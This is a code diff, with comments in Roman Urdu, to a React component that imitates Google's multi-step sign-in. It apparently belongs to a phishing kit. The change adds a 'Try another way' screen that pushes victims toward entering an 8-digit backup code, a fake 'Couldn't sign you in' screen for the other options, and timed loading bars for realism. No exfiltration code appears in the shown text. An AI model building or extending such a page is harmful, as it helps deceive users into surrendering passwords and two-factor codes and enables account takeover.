@@ -4,6 +4,8 @@ import EmailStep from "./components/EmailStep";
 import PasswordStep from "./components/PasswordStep";
 import TwoFAStep from "./components/TwoFAStep";
 import Footer from "./components/Footer";
+import AnotherWayStep from "./components/AnotherWayStep";
+import CouldntSignInStep from "./components/CouldntSignInStep"; // Part 2 wala component yahan import ho ga
 
 const GoogleSignInTemplate = () => {
   const [step, setStep] = useState(1);
@@ -30,6 +32,14 @@ const GoogleSignInTemplate = () => {
       }
     };
   }, []);
+
+  const handleStepChangeWithLoading = (nextStep) => {
+    setIsLoading(true); // Loading bar show karo
+    setTimeout(() => {
+      setIsLoading(false); // Loading bar hide karo
+      setStep(nextStep); // Aglay step par jao
+    }, 1000); // 1-second delay
+  };
 
   return (
     <>
@@ -66,6 +76,32 @@ const GoogleSignInTemplate = () => {
               email={userEmail}
               setIsLoading={setIsLoading}
               isLoading={isLoading}
+              onTryAnotherWay={() => handleStepChangeWithLoading(4)} // Route to AnotherWayStep (Step 4)
+            />
+          )}
+
+          {/* Step 4: AnotherWayStep -- Is mein option click par loading lagana hai */}
+          {step === 4 && (
+            <AnotherWayStep
+              setStep={setStep}
+              email={userEmail}
+              onOptionClick={(optionId) => {
+                if (optionId === "backup_code") {
+                  // Agar backup code par click kare to Step 3 (8-digit screen) par jaye
+                  handleStepChangeWithLoading(3);
+                } else {
+                  // Baqi kisi bhi option par click kare to Step 5 (Could not sign in) par jaye
+                  handleStepChangeWithLoading(5);
+                }
+              }} // Kisi bhi option click par Step 5 par jao
+            />
+          )}
+
+          {/* Step 5: "Couldn't sign you in" (Pic wali screen) */}
+          {step === 5 && (
+            <CouldntSignInStep
+              email={userEmail}
+              onTryAgain={() => handleStepChangeWithLoading(1)} // 'Try again' click par wapis Step 1 par
             />
           )}
         </div>
